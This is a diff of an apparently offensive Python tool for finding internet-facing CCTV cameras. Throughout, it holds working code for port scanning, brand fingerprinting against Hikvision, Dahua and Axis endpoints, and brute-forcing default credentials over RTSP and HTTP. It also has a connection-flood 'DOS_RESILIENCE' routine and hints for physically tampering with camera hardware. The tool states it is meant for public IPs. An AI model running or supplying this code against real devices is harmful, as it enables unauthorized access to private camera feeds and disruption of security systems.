-            print(f"  🔍 IP: {data.get('ip', 'N/A')}")
-            print(f"  🏢 ISP: {data.get('org', 'N/A')}")
-            
-            # Location Information
-            if 'loc' in data:
-                lat, lon = data['loc'].split(',')
-                print(f"\n  📍 Coordinates:")
-                print(f"    Latitude: {lat}")
-                print(f"    Longitude: {lon}")
-                print(f"    🔗 Google Maps: https://www.google.com/maps?q={lat},{lon}")
-                print(f"    🔗 Google Earth: https://earth.google.com/web/@{lat},{lon},0a,1000d,35y,0h,0t,0r")
-            
-            # Geographic Information
-            print(f"\n  🌎 Geographic Details:")
-            print(f"    City: {data.get('city', 'N/A')}")
-            print(f"    Region: {data.get('region', 'N/A')}")
-            print(f"    Country: {data.get('country', 'N/A')}")
-            print(f"    Postal Code: {data.get('postal', 'N/A')}")
-            
-            # Timezone Information
-            if 'timezone' in data:
-                print(f"\n  ⏰ Timezone: {data['timezone']}")
-            
-        else:
-            print(f"{R}[!] Failed to fetch IP information.{W}")
-    except Exception as e:
-        print(f"{R}[!] Error getting IP information: {str(e)}{W}")
-
-def parse_ip_port(input_str):
-    """Parse IP:PORT format or just IP. Returns (ip, port) where port is None if not provided."""
-    input_str = input_str.strip()
-    
-    # Check if port is provided
-    if ':' in input_str:
-        parts = input_str.rsplit(':', 1)  # Split from right to handle IPv6
-        if len(parts) == 2:
-            ip_str, port_str = parts
-            try:
-                port = int(port_str)
-                if 1 <= port <= 65535:
-                    return ip_str.strip(), port
-                else:
-                    print(f"{R}[!] Invalid port number. Must be between 1-65535{W}")
-                    return None, None
-            except ValueError:
-                print(f"{R}[!] Invalid port number: {port_str}{W}")
-                return None, None
-    
-    # No port provided, just IP
-    return input_str, None
-
-def validate_ip(target_ip):
-    """Validate IP address (with or without port)"""
-    try:
-        ip = ipaddress.ip_address(target_ip)
-        if ip.is_private:
-            print(f"{R}[!] Warning: Private IP address detected. This tool is meant for public IPs.{W}")
-        return True
-    except ValueError:
-        print(f"{R}[!] Invalid IP address format{W}")
-        return False
-
-def get_protocol(port):
-    return "https" if port in HTTPS_PORTS else "http"
+# Common HTTP camera paths for stream detection
+HTTP_CAMERA_PATHS = [
+    "/video", "/stream", "/live", "/mjpeg/video.mjpg", "/snapshot.jpg",
+    "/cgi-bin/mjpg/video.cgi", "/axis-cgi/mjpg/video.cgi", "/video.cgi",
+    "/videostream.cgi", "/mjpg.cgi", "/stream.cgi", "/live.cgi",
+    "/cgi-bin/viewer/video.jpg", "/img/snapshot.cgi", "/cgi-bin/snapshot.cgi",
+    "/video/mjpg.cgi", "/api/video", "/api/stream/live", "/api/video/live",
+    "/api/live", "/api/stream", "/api/camera/video", "/mjpeg", "/videoMain",
+    "/nphControlCamera", "/axis-media/media.amp"
+]
 
 def probe_rtsp(ip, port):
-    """
-    Best‑effort RTSP detection that does NOT rely only on port number.
-    Sends a minimal RTSP OPTIONS request and inspects the response.
-    """
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(PORT_SCAN_TIMEOUT)
-            if s.connect_ex((ip, port)) != 0:
-                return False
+            s.settimeout(0.8)
+            if s.connect_ex((ip, port)) == 0:
+                s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
+                response = s.recv(1024).decode(errors="ignore")
+                if "RTSP/1.0" in response:
+                    server = ""
+                    for line in response.splitlines():
+                        if line.lower().startswith("server:"):
+                            server = line.split(":", 1)[1].strip()
+                    return True, server
+    except: pass
+    return False, ""
 
-            request = (
-                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
-                "CSeq: 1\r\n"
-                "\r\n"
-            ).encode("ascii", errors="ignore")
+def test_dos_resilience(ip, port):
+    """Aggressive connection flood for Storm Module"""
+    print(f"\n  [{FIRE}] Starting DOS_RESILIENCE on Port {port}...")
 
-            s.sendall(request)
+    connections = []
+    try:
+        for i in range(80):   # Increased from 50
             try:
-                data = s.recv(2048)
-            except socket.timeout:
-                return False
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.6)
+                if s.connect_ex((ip, port)) == 0:
+                    connections.append(s)
+            except:
+                pass
 
-            if not data:
-                return False
+        print(f"       {OPEN} Opened {len(connections)} concurrent connections")
 
-            text = data.decode(errors="ignore")
-            if "RTSP/1.0" not in text:
-                return False
+        # Quick responsiveness check
+        try:
+            start = time.time()
+            r = requests.get(f"http://{ip}:{port}", timeout=3, verify=False)
+            latency = time.time() - start
+            print(f"       {INFO} Service Latency: {latency:.2f}s")
+            if latency > 2.0:
+                print(f"       {ALRT} Service is slowing down under load!")
+        except:
+            print(f"       {FIRE} Service appears vulnerable / overwhelmed!")
 
-            # Look for typical RTSP verbs or Public header
-            indicators = ["Public:", "DESCRIBE", "SETUP", "PLAY"]
-            return any(ind in text for ind in indicators)
-    except Exception:
-        return False
+    except Exception as e:
+        print(f"       {ERR} Stress test error: {str(e)}")
+    finally:
+        for s in connections:
+            try: s.close()
+            except: pass
 
-def check_ports(ip, additional_ports=None):
+def get_physical_security_hints(brand):
     """
-    Scan ports on target IP.
-    
-    Args:
-        ip: Target IP address
-        additional_ports: Optional list of additional ports to scan (e.g., user-specified ports)
-    
-    Returns:
-        tuple: (open_ports, rtsp_ports)
+    Advanced Physical Security Assessment logic.
+    Provides detailed intelligence on hardware-level vulnerabilities.
     """
-    # Combine COMMON_PORTS with any additional ports
-    ports_to_scan = list(COMMON_PORTS)
-    if additional_ports:
-        for port in additional_ports:
-            if port not in ports_to_scan:
-                ports_to_scan.append(port)
-    
-    print(f"\n[🔍] {C}Scanning comprehensive CCTV ports on IP:{W}", ip)
-    print(f"{Y}[⚠️] This will scan {len(ports_to_scan)} ports. This may take a while...{W}")
-    open_ports = []
-    rtsp_ports = []  # Track RTSP-detected ports
-    lock = threading.Lock()
-    scanned_count = 0
-
-    def scan_port(port):
-        nonlocal scanned_count
-        if not threads_running:
-            return
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.settimeout(PORT_SCAN_TIMEOUT)
-            try:
-                if sock.connect_ex((ip, port)) == 0:
-                    with lock:
-                        open_ports.append(port)
-                        scanned_count += 1  # Count open ports too
-                        # Determine protocol (current scan is TCP only)
-                        proto = "tcp"
-
-                        # First, actively probe for RTSP on this port
-                        is_rtsp = probe_rtsp(ip, port)
-                        if is_rtsp:
-                            rtsp_ports.append(port)  # Track RTSP port
-                            if port == 554:
-                                service_name, service_desc = "RTSP", "Real-Time Streaming Protocol"
-                            else:
-                                service_name, service_desc = "RTSP", "Non-standard port"
-                        else:
-                            # Look up a friendly service name if known
-                            service_name, service_desc = PORT_SERVICE_MAP.get(
-                                port, ("Unknown Service", "")
-                            )
-
-                        if service_desc:
-                            service_str = f"{service_name}  ({service_desc})"
-                        else:
-                            service_str = service_name
-
-                        print(f"  ✅ [OPEN] {port}/{proto}  {service_str}")
-
-                        # If RTSP was positively detected, also show a suggested stream URL
-                        if is_rtsp:
-                            print(f"      Stream URL: rtsp://{ip}:{port}/")
-                        
-                        # Progress indicator
-                        if scanned_count % 50 == 0:
-                            print(f"  📊 Scanned {scanned_count}/{len(ports_to_scan)} ports...")
-                else:
-                    with lock:
-                        scanned_count += 1
-                        if scanned_count % 50 == 0:  # Progress indicator every 50 ports
-                            print(f"  📊 Scanned {scanned_count}/{len(ports_to_scan)} ports...")
-            except Exception:
-                with lock:
-                    scanned_count += 1
-
-    # Use more threads for faster scanning
-    max_threads = 100  # Increased thread count
-    threads = []
-    
-    for i, port in enumerate(ports_to_scan):
-        thread = threading.Thread(target=scan_port, args=(port,))
-        thread.daemon = True
-        threads.append(thread)
-        thread.start()
-        
-        # Limit concurrent threads to avoid overwhelming the system
-        if len(threads) >= max_threads:
-            for t in threads:
-                t.join()
-            threads = []
-
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join()
-
-    print(f"\n{Y}[📊] Scan completed: {scanned_count} ports checked, {len(open_ports)} ports open{W}")
-    return sorted(open_ports), sorted(rtsp_ports)  # Return both open ports and RTSP ports
-
-def check_if_camera(ip, open_ports):
-    """Enhanced camera detection with detailed port analysis"""
-    print(f"\n{C}[📷] Analyzing Ports for Camera Indicators:{W}")
-    camera_indicators = False
-    
-    # Common camera server headers and keywords
-    camera_servers = {
-        'hikvision': ['hikvision', 'dvr', 'nvr'],
-        'dahua': ['dahua', 'dvr', 'nvr'],
-        'axis': ['axis', 'axis communications'],
-        'sony': ['sony', 'ipela'],
-        'bosch': ['bosch', 'security systems'],
-        'samsung': ['samsung', 'samsung techwin'],
-        'panasonic': ['panasonic', 'network camera'],
-        'vivotek': ['vivotek', 'network camera'],
-        'cp plus': ['cp plus', 'cp-plus', 'cpplus', 'cp_plus'],
-        'generic': ['camera', 'webcam', 'surveillance', 'ip camera', 'network camera', 'dvr', 'nvr', 'recorder']
-    }
-    
-    # Common camera content types
-    camera_content_types = [
-        'image/jpeg',
-        'image/mjpeg',
-        'video/mpeg',
-        'video/mp4',
-        'video/h264',
-        'application/x-mpegURL',
-        'video/MP2T',
-        'application/octet-stream',
-        'text/html',
-        'application/json'
+    base_hints = [
+        "Inspect for external RESET buttons on pigtail cables or under flaps.",
+        "Check for unshielded SD Card slots that allow physical data extraction.",
+        "Look for visible UART/Serial headers (often 4 pins) on the internal PCB.",
+        "Scan for exposed USB ports used for local maintenance or firmware loading."
     ]
-    
-    def analyze_port(port):
-        nonlocal camera_indicators
-        protocol = get_protocol(port)
-        base_url = f"{protocol}://{ip}:{port}"
-        
-        print(f"\n  🔍 Analyzing Port {port} ({protocol.upper()}):")
-        
-        # Check server headers and response
-        try:
-            response = requests.get(base_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            server_header = response.headers.get('Server', '').lower()
-            content_type = response.headers.get('Content-Type', '').lower()
-            
-            # Check server headers for camera brands
-            brand_found = False
-            for brand, keywords in camera_servers.items():
-                if any(keyword in server_header for keyword in keywords):
-                    print(f"    ✅ {brand.upper()} Camera Server Detected")
-                    brand_found = True
-                    camera_indicators = True
-                    break
-            
-            # Check content type
-            if any(ct in content_type for ct in camera_content_types):
-                print(f"    ✅ Camera Content Type: {content_type}")
-                camera_indicators = True
-            
-            # Check response content for camera indicators
-            if response.status_code == 200:
-                content = response.text.lower()
-                camera_keywords = ['camera', 'webcam', 'surveillance', 'stream', 'video', 'snapshot', 'dvr', 'nvr', 'recorder', 'cctv']
-                found_keywords = [kw for kw in camera_keywords if kw in content]
-                if found_keywords:
-                    print(f"    ✅ Camera Keywords Found: {', '.join(found_keywords)}")
-                    camera_indicators = True
-                
-                # Check for specific CP Plus indicators
-                if any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
-                    print(f"    ✅ CP Plus Camera Detected!")
-                    camera_indicators = True
-            
-            # Check common camera endpoints
-            endpoints = ['/video', '/stream', '/snapshot', '/cgi-bin', '/admin', '/viewer', '/login', '/index.html', '/']
-            for endpoint in endpoints:
-                try:
-                    endpoint_url = f"{base_url}{endpoint}"
-                    endpoint_response = requests.head(endpoint_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-                    if endpoint_response.status_code in [200, 401, 403]:
-                        print(f"    ✅ Camera Endpoint Found: {endpoint_url} (HTTP {endpoint_response.status_code})")
-                        camera_indicators = True
-                except (requests.exceptions.RequestException, Exception):
-                    continue
-            
-            # Print server information
-            if server_header:
-                print(f"    ℹ️ Server: {server_header}")
-            print(f"    ℹ️ Status Code: {response.status_code}")
-            
-            # Check for authentication
-            if response.status_code == 401:
-                print(f"    🔐 Authentication Required")
-                auth_type = response.headers.get('WWW-Authenticate', '')
-                if auth_type:
-                    print(f"    🔐 Auth Type: {auth_type}")
-            
-            # Additional checks for DVR/NVR devices
-            if response.status_code == 200:
-                # Check for common DVR/NVR page titles
-                if '<title>' in content:
-                    title_start = content.find('<title>') + 7
-                    title_end = content.find('</title>', title_start)
-                    if title_end > title_start:
-                        title = content[title_start:title_end].lower()
-                        if any(x in title for x in ['dvr', 'nvr', 'recorder', 'surveillance', 'cctv', 'camera']):
-                            print(f"    ✅ DVR/NVR Page Title: {title}")
-                            camera_indicators = True
-                
-                # Check for common DVR/NVR form fields
-                if any(x in content for x in ['username', 'password', 'login', 'admin']):
-                    print(f"    ✅ Login Form Detected")
-                    camera_indicators = True
-                
-                # Check for specific CP Plus model indicators
-                if any(x in content for x in ['uvr-0401e1', 'uvr0401e1', '0401e1']):
-                    print(f"    ✅ CP Plus UVR-0401E1 Model Detected!")
-                    camera_indicators = True
-            
-        except requests.exceptions.RequestException as e:
-            print(f"    ❌ Connection Error: {str(e)}")
-        except Exception as e:
-            print(f"    ❌ Error: {str(e)}")
-    
-    # Analyze each port
-    for port in open_ports:
-        analyze_port(port)
-    
-    return camera_indicators
 
-def check_login_pages(ip, open_ports):
-    print(f"\n[🔍] {C}Checking for authentication pages:{W}")
-    found_urls = []
-    lock = threading.Lock()
-    
-    def check_endpoint(port, path):
-        protocol = get_protocol(port)
-        url = f"{protocol}://{ip}:{port}{path}"
-        try:
-            response = requests.head(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if response.status_code in [200, 401, 403]:
-                with lock:
-                    found_urls.append(url)
-                    print(f"  ✅ Found login page: {url} (HTTP {response.status_code})")
-                return url
-        except (requests.exceptions.RequestException, Exception):
-            pass
-        return None
-
-    # Use threading for faster checking
-    threads = []
-    max_concurrent = 50  # Limit concurrent threads
-    
-    for port in open_ports:
-        for path in COMMON_PATHS:
-            thread = threading.Thread(target=check_endpoint, args=(port, path))
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            
-            # Limit concurrent threads to avoid overwhelming
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
-                threads = []
-    
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join()
-    
-    if not found_urls:
-        print("  ❌ No authentication pages detected")
-    else:
-        print(f"  📊 Found {len(found_urls)} authentication pages")
-
-def test_rtsp_credentials(ip, port, username, password):
-    """Test RTSP credentials using RTSP OPTIONS request with Basic Auth"""
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(2)
-            if s.connect_ex((ip, port)) != 0:
-                return False
-            
-            # RTSP OPTIONS request with Basic Auth
-            auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
-            request = (
-                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
-                f"Authorization: Basic {auth_string}\r\n"
-                "CSeq: 1\r\n"
-                "\r\n"
-            ).encode("ascii", errors="ignore")
-            
-            s.sendall(request)
-            try:
-                data = s.recv(2048)
-            except socket.timeout:
-                return False
-            
-            if not data:
-                return False
-            
-            text = data.decode(errors="ignore")
-            # RTSP 200 OK means authentication succeeded
-            if "RTSP/1.0 200" in text or "RTSP/1.0 200 OK" in text:
-                return True
-            # RTSP 401 Unauthorized means wrong credentials
-            if "RTSP/1.0 401" in text:
-                return False
-    except Exception:
-        pass
-    return False
-
-def test_default_passwords(ip, open_ports, rtsp_ports=None):
-    print(f"\n[🔑] {C}Testing common credentials:{W}")
-    found = False
-    lock = threading.Lock()
-    start_time = time.time()
-    MAX_CREDENTIAL_TEST_TIME = 120  # Maximum 2 minutes total for credential testing
-    CREDENTIAL_TIMEOUT = 2  # Reduced timeout per request (2 seconds instead of 5)
-    
-    if rtsp_ports is None:
-        rtsp_ports = []
-    
-    # Prioritized list of most common credentials (test these first)
-    # Format: (username, password)
-    PRIORITY_CREDENTIALS = [
-        ("admin", "admin"),
-        ("admin", "1234"),
-        ("admin", "12345"),
-        ("admin", "123456"),
-        ("admin", "password"),
-        ("admin", ""),  # Empty password
-        ("admin", "admin123"),
-        ("admin", "888888"),
-        ("admin", "666666"),
-        ("root", "root"),
-        ("root", "toor"),
-        ("root", "1234"),
-        ("admin", "1111"),
-        ("admin", "0000"),
-        ("admin", "8888"),
-        ("user", "user"),
-        ("guest", "guest"),
-    ]
-    
-    # Include RTSP ports (MOST IMPORTANT for CCTV!) and web ports
-    RTSP_PORTS_LIST = [554, 8554, 10554, 5554, 7070, 8555]  # Common RTSP ports
-    WEB_PORTS = [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8888, 9000]
-    
-    # Prioritize RTSP ports - they're the most important for CCTV cameras!
-    ports_to_test = []
-    
-    # First add RTSP ports (detected + standard)
-    all_rtsp_ports = set(rtsp_ports) | set([p for p in open_ports if p in RTSP_PORTS_LIST])
-    ports_to_test.extend(sorted(all_rtsp_ports))
-    
-    # Then add web ports
-    web_ports = [p for p in open_ports if p in WEB_PORTS or (p < 10000 and p not in all_rtsp_ports)]
-    ports_to_test.extend(web_ports[:10])  # Limit web ports to first 10
-    
-    if not ports_to_test:
-        print(f"{Y}[ℹ️] No ports found for credential testing{W}")
-        return
-    
-    rtsp_count = len(all_rtsp_ports)
-    web_count = len(web_ports[:10])
-    print(f"{Y}[ℹ️] Testing credentials on {rtsp_count} RTSP port(s) + {web_count} web port(s)...{W}")
-    if rtsp_count > 0:
-        print(f"{C}[🎯] RTSP ports are prioritized (most important for CCTV cameras!){W}")
-    
-    tested_count = [0]  # Track number of credentials tested
-    
-    def test_http_credentials(protocol, port, path, auth_type, credentials_list):
-        """Test HTTP/HTTPS credentials"""
-        nonlocal found
-        if found:
-            return False
-        
-        if time.time() - start_time > MAX_CREDENTIAL_TEST_TIME:
-            return False
-            
-        url = f"{protocol}://{ip}:{port}{path}"
-        for username, password in credentials_list:
-            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-                return False
-            
-            with lock:
-                tested_count[0] += 1
-                if tested_count[0] % 20 == 0:
-                    elapsed = int(time.time() - start_time)
-                    print(f"  📊 Tested {tested_count[0]} credentials... ({elapsed}s elapsed)")
-            
-            try:
-                if auth_type == "basic":
-                    response = requests.get(url, auth=(username, password), 
-                                        headers=HEADERS, timeout=CREDENTIAL_TIMEOUT, verify=False)
-                elif auth_type == "form":
-                    response = requests.post(url, data={'username': username, 'password': password},
-                                            headers=HEADERS, timeout=CREDENTIAL_TIMEOUT, verify=False)
-                
-                if response.status_code == 200:
-                    with lock:
-                        if not found:
-                            found = True
-                            print(f"🔥 Success! {username}:{password} @ {url}")
-                    return True
-            except requests.exceptions.Timeout:
-                continue
-            except requests.exceptions.RequestException:
-                continue
-            except Exception:
-                pass
-        return False
-    
-    def test_rtsp_credentials_thread(port, credentials_list):
-        """Test RTSP credentials in a thread"""
-        nonlocal found
-        if found:
-            return False
-        
-        if time.time() - start_time > MAX_CREDENTIAL_TEST_TIME:
-            return False
-        
-        for username, password in credentials_list:
-            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-                return False
-            
-            with lock:
-                tested_count[0] += 1
-                if tested_count[0] % 20 == 0:
-                    elapsed = int(time.time() - start_time)
-                    print(f"  📊 Tested {tested_count[0]} credentials... ({elapsed}s elapsed)")
-            
-            if test_rtsp_credentials(ip, port, username, password):
-                with lock:
-                    if not found:
-                        found = True
-                        print(f"🔥 Success! RTSP {username}:{password} @ rtsp://{ip}:{port}/")
-                return True
-        return False
-
-    # Test endpoints with threading
-    threads = []
-    max_concurrent = 30
-    THREAD_JOIN_TIMEOUT = 5
-    
-    # PRIORITY 1: Test RTSP ports first (MOST IMPORTANT!)
-    for port in sorted(all_rtsp_ports):
-        if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-            break
-        
-        # Test RTSP credentials
-        thread = threading.Thread(target=test_rtsp_credentials_thread, args=(port, PRIORITY_CREDENTIALS))
-        thread.daemon = True
-        threads.append(thread)
-        thread.start()
-        
-        if len(threads) >= max_concurrent:
-            for t in threads:
-                t.join(timeout=THREAD_JOIN_TIMEOUT)
-            threads = []
-    
-    # PRIORITY 2: Test HTTP/HTTPS credentials on web ports
-    endpoints = [
-        ("/", "basic"),  # Most common - HTTP Basic Auth
-        ("/login", "form"),  # Common login form
-    ]
-    
-    for port in web_ports[:10]:
-        if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-            break
-        protocol = get_protocol(port)
-        
-        for path, auth_type in endpoints:
-            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-                break
-            
-            thread = threading.Thread(target=test_http_credentials, args=(protocol, port, path, auth_type, PRIORITY_CREDENTIALS))
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join(timeout=THREAD_JOIN_TIMEOUT)
-                threads = []
-    
-    # Wait for priority credentials to finish
-    for thread in threads:
-        thread.join(timeout=THREAD_JOIN_TIMEOUT)
-    threads = []
-    
-    # If not found, test remaining credentials (but only if we have time)
-    if not found and (time.time() - start_time < MAX_CREDENTIAL_TEST_TIME * 0.7):
-        # Flatten all credentials for remaining tests
-        all_credentials = []
-        for username, passwords in DEFAULT_CREDENTIALS.items():
-            for password in passwords:
-                if (username, password) not in PRIORITY_CREDENTIALS:
-                    all_credentials.append((username, password))
-        
-        # Test remaining RTSP credentials
-        for port in sorted(all_rtsp_ports)[:3]:  # Only first 3 RTSP ports
-            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-                break
-            thread = threading.Thread(target=test_rtsp_credentials_thread, args=(port, all_credentials[:30]))
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join(timeout=THREAD_JOIN_TIMEOUT)
-                threads = []
-        
-        # Test remaining HTTP credentials on fewer ports
-        for port in web_ports[:3]:
-            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
-                break
-            protocol = get_protocol(port)
-            thread = threading.Thread(target=test_http_credentials, args=(protocol, port, "/", "basic", all_credentials[:30]))
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join(timeout=THREAD_JOIN_TIMEOUT)
-                threads = []
-    
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join(timeout=THREAD_JOIN_TIMEOUT)
-    
-    elapsed_time = time.time() - start_time
-    if elapsed_time >= MAX_CREDENTIAL_TEST_TIME:
-        print(f"{Y}[⚠️] Credential testing stopped after {MAX_CREDENTIAL_TEST_TIME}s timeout{W}")
-    else:
-        print(f"{C}[✓] Tested {tested_count[0]} credentials in {int(elapsed_time)}s{W}")
-    
-    if not found:
-        print("❌ No default credentials found")
-
-def try_default_credentials(ip, port):
-    """Attempt to find working credentials for fingerprinting"""
-    for username, passwords in DEFAULT_CREDENTIALS.items():
-        for password in passwords:
-            try:
-                response = requests.get(
-                    f"http://{ip}:{port}/",
-                    auth=(username, password),
-                    headers=HEADERS,
-                    timeout=TIMEOUT,
-                    verify=False
-                )
-                if response.status_code == 200:
-                    return f"{username}:{password}"
-            except (requests.exceptions.RequestException, Exception):
-                pass
-    return None
-
-def search_cve(brand):
-    """Enhanced CVE lookup functionality"""
-    print(f"\n[🛡️] Checking known CVEs for {brand.capitalize()}:")
-    if cves := CVE_DATABASE.get(brand.lower()):
-        for cve in cves:
-            print(f"  🔗 https://nvd.nist.gov/vuln/detail/{cve}")
-    else:
-        print("  ℹ️ No common CVEs found for this brand")
-
-def fingerprint_camera(ip, open_ports):
-    print(f"\n[📡] {C}Scanning for Camera Type & Firmware:{W}")
-    for port in open_ports:
-        protocol = get_protocol(port)
-        url_base = f"{protocol}://{ip}:{port}"
-        print(f"🔍 Checking {url_base}...")
-        try:
-            resp = requests.get(url_base, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            server_header = resp.headers.get("server", "").lower()
-            content = resp.text.lower()
-            
-            if "hikvision" in server_header:
-                print("🔥 Hikvision Camera Detected!")
-                fingerprint_hikvision(ip, port)
-            elif "dahua" in server_header:
-                print("🔥 Dahua Camera Detected!")
-                fingerprint_dahua(ip, port)
-            elif "axis" in server_header:
-                print("🔥 Axis Camera Detected!")
-                fingerprint_axis(ip, port)
-            elif any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
-                print("🔥 CP Plus Camera Detected!")
-                fingerprint_cp_plus(ip, port)
-            else:
-                print("❓ Unknown Camera Type")
-                fingerprint_generic(ip, port)
-        except (requests.exceptions.RequestException, Exception):
-            print("❌ No response")
-
-def fingerprint_hikvision(ip, port):
-    print("➡️  Attempting Hikvision Fingerprint...")
-    protocol = get_protocol(port)
-    credentials = try_default_credentials(ip, port) or "admin:1234"
-    auth_b64 = base64.b64encode(credentials.encode()).decode()
-    
-    endpoints = [
-        f"{protocol}://{ip}:{port}/System/configurationFile?auth={auth_b64}",
-        f"{protocol}://{ip}:{port}/ISAPI/System/deviceInfo"
-    ]
-    
-    for url in endpoints:
-        try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if resp.status_code == 401:
-                print(f"⚠️ Authentication failed for {url}")
-                continue
-            if resp.status_code == 200:
-                print(f"✅ Found at {url}")
-                if "configurationFile" in url:
-                    try:
-                        xml_root = ET.fromstring(resp.text)
-                        model = xml_root.findtext(".//model")
-                        firmware = xml_root.findtext(".//firmwareVersion")
-                        if model:
-                            print(f"📸 Model: {model}")
-                        if firmware:
-                            print(f"🛡️ Firmware: {firmware}")
-                    except ET.ParseError:
-                        print("⚠️ Cannot parse XML configuration")
-                else:
-                    print(resp.text)
-        except Exception as e:
-            print(f"⚠️ {e}")
-    search_cve("hikvision")
-
-def fingerprint_dahua(ip, port):
-    print("➡️  Attempting Dahua Fingerprint...")
-    protocol = get_protocol(port)
-    try:
-        url = f"{protocol}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo"
-        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-        if resp.status_code == 200:
-            print(f"✅ Found at {url}")
-            print(resp.text.strip())
-        else:
-            print(f"❌ {url} -> HTTP {resp.status_code}")
-    except Exception as e:
-        print(f"⚠️ {e}")
-    search_cve("dahua")
-
-def fingerprint_axis(ip, port):
-    print("➡️  Attempting Axis Fingerprint...")
-    protocol = get_protocol(port)
-    try:
-        url = f"{protocol}://{ip}:{port}/axis-cgi/admin/param.cgi?action=list"
-        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-        if resp.status_code == 200:
-            print(f"✅ Found at {url}")
-            for line in resp.text.splitlines():
-                if any(x in line for x in ["root.Brand", "root.Model", "root.Firmware"]):
-                    print(f"🔹 {line.strip()}")
-        else:
-            print(f"❌ {url} -> HTTP {resp.status_code}")
-    except Exception as e:
-        print(f"⚠️ {e}")
-    search_cve("axis")
-
-def fingerprint_cp_plus(ip, port):
-    print("➡️  Attempting CP Plus Fingerprint...")
-    protocol = get_protocol(port)
-    
-    # CP Plus specific endpoints
-    endpoints = [
-        f"{protocol}://{ip}:{port}/",
-        f"{protocol}://{ip}:{port}/index.html",
-        f"{protocol}://{ip}:{port}/login",
-        f"{protocol}://{ip}:{port}/admin",
-        f"{protocol}://{ip}:{port}/cgi-bin",
-        f"{protocol}://{ip}:{port}/api",
-        f"{protocol}://{ip}:{port}/config"
-    ]
-    
-    for url in endpoints:
-        try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if resp.status_code == 200:
-                print(f"✅ Found at {url}")
-                content = resp.text.lower()
-                
-                # Look for CP Plus specific information
-                if 'uvr-0401e1' in content or 'uvr0401e1' in content:
-                    print(f"📸 Model: CP-UVR-0401E1-IC2")
-                if 'cp plus' in content or 'cpplus' in content:
-                    print(f"🏢 Brand: CP Plus")
-                if 'dvr' in content:
-                    print(f"📺 Device Type: DVR")
-                
-                # Print first 500 characters for analysis
-                print(f"📄 Response Preview: {resp.text[:500]}")
-                break
-        except Exception as e:
-            print(f"⚠️ {e}")
-    
-    search_cve("cp plus")
-
-def fingerprint_generic(ip, port):
-    print("➡️  Attempting Generic Fingerprint...")
-    protocol = get_protocol(port)
-    endpoints = [
-        "/System/configurationFile",
-        "/ISAPI/System/deviceInfo",
-        "/cgi-bin/magicBox.cgi?action=getSystemInfo",
-        "/axis-cgi/admin/param.cgi?action=list",
-        "/",
-        "/index.html",
-        "/login",
-        "/admin",
-        "/cgi-bin",
-        "/api",
-        "/config"
-    ]
-    brand_keywords = {
-        "hikvision": ["hikvision"],
-        "dahua": ["dahua"],
-        "axis": ["axis"],
-        "cp plus": ["cp plus", "cp-plus", "cpplus", "cp_plus", "uvr", "0401e1"],
-    }
-    detected_brand = None
-    for path in endpoints:
-        url = f"{protocol}://{ip}:{port}{path}"
-        try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if resp.status_code == 200:
-                print(f"✅ Found at {url}")
-                snippet = resp.text[:500]
-                print(snippet)
-                # Try to detect brand in response text or headers
-                text = (resp.text + " " + str(resp.headers)).lower()
-                for brand, keywords in brand_keywords.items():
-                    if any(keyword in text for keyword in keywords):
-                        detected_brand = brand
-                        break
-                if detected_brand:
-                    search_cve(detected_brand)
-                    break  # Continue checking other endpoints
-        except (requests.exceptions.RequestException, Exception):
-            pass
-    if not detected_brand:
-        print("❌ No common endpoints responded.")
-
-def check_stream(url):
-    """Enhanced stream detection with multiple methods"""
-    try:
-        # Method 1: Try HEAD request first
-        response = requests.head(url, timeout=TIMEOUT, verify=False)
-        if response.status_code == 200:
-            # Check content type for video/stream indicators
-            content_type = response.headers.get('Content-Type', '').lower()
-            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp']):
-                return True
-            # Check for common video file extensions in URL
-            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm']):
-                return True
-            # Check for streaming protocols in URL
